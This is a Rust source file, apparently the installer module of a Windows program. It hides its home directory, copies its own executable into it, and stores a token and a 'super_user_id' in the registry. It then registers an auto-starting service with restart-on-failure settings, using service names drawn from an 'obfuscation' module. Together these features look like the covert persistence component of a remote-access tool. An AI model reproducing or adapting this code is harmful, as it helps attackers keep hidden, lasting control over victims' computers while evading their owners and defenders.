use std::os::windows::ffi::OsStrExt;
use std::path::PathBuf;

use anyhow::{Context, Result};
use windows_service::service::{
    ServiceAccess, ServiceErrorControl, ServiceInfo, ServiceStartType, ServiceType,
};
use windows_service::service_manager::{ServiceManager, ServiceManagerAccess};

use crate::security::obfuscation;

pub fn cleanup_old_files() {
    let home = obfuscation::install_home();
    if let Ok(entries) = std::fs::read_dir(home) {
        for entry in entries.flatten() {
            if entry.path().extension().is_some_and(|e| e == "old") {
                let _ = std::fs::remove_file(entry.path());
            }
        }
    }
}

pub fn setup_home_dir() -> Result<(PathBuf, PathBuf)> {
    let home = obfuscation::install_home();
    std::fs::create_dir_all(home)
        .with_context(|| format!("cannot create home dir: {}", home.display()))?;

    let attrs = unsafe {
        windows_sys::Win32::Storage::FileSystem::GetFileAttributesW(
            home.as_os_str().encode_wide().collect::<Vec<_>>().as_ptr(),
        )
    };
    if attrs != u32::MAX {
        unsafe {
            windows_sys::Win32::Storage::FileSystem::SetFileAttributesW(
                home.as_os_str().encode_wide().collect::<Vec<_>>().as_ptr(),
                attrs | windows_sys::Win32::Storage::FileSystem::FILE_ATTRIBUTE_HIDDEN,
            );
        }
    }

    let current_exe = std::env::current_exe().context("cannot get current exe path")?;
    let canonical_current = current_exe
        .canonicalize()
        .unwrap_or_else(|_| current_exe.clone());
    let target_exe = home.join(current_exe.file_name().context("cannot get exe filename")?);
    let canonical_target = target_exe
        .canonicalize()
        .unwrap_or_else(|_| target_exe.clone());

    if canonical_current != canonical_target {
        std::fs::copy(&current_exe, &target_exe).with_context(|| {
            format!(
                "cannot copy exe from {} to {}",
                current_exe.display(),
                target_exe.display()
            )
        })?;
        log::info!("Copied exe to {}", target_exe.display());
    } else {
        log::info!("Already running from home dir, skipping copy");
    }

    Ok((home.to_path_buf(), target_exe))
}

pub fn install(token: &str, super_user_id: i64) -> Result<()> {
    super::config::save_to_registry(token, super_user_id)?;

    let (_home, exe_path) = setup_home_dir()?;

    let manager =
        ServiceManager::local_computer(None::<&str>, ServiceManagerAccess::CREATE_SERVICE)
            .context("cannot open SCM")?;

    let service_name = obfuscation::service_name();
    let display_name = obfuscation::service_display();

    let service_info = ServiceInfo {
        name: service_name.into(),
        display_name: display_name.into(),
        service_type: ServiceType::OWN_PROCESS,
        start_type: ServiceStartType::AutoStart,
        error_control: ServiceErrorControl::Normal,
        executable_path: exe_path,
        launch_arguments: vec![],
        dependencies: vec![],
        account_name: None,
        account_password: None,
    };

    let service = manager
        .create_service(&service_info, ServiceAccess::CHANGE_CONFIG)
        .context("cannot create service")?;

    service
        .set_failure_actions_on_non_crash_failures(true)
        .context("cannot set failure actions")?;

    log::info!("Service installed successfully");
    Ok(())
}

pub fn uninstall() -> Result<()> {
    let manager = ServiceManager::local_computer(None::<&str>, ServiceManagerAccess::CONNECT)
        .context("cannot open SCM")?;

    let service_name = obfuscation::service_name();
    let service = manager
        .open_service(service_name, ServiceAccess::DELETE | ServiceAccess::STOP)
        .context("cannot open service")?;

    let _ = service.stop();

    service.delete().context("cannot delete service")?;
    log::info!("Service deleted");

    let home = obfuscation::install_home();
    if home.exists() {
        std::fs::remove_dir_all(home)
            .with_context(|| format!("cannot remove home dir: {}", home.display()))?;
        log::info!("Removed home dir: {}", home.display());
    }

    log::info!("Service uninstalled successfully");
    Ok(())
}
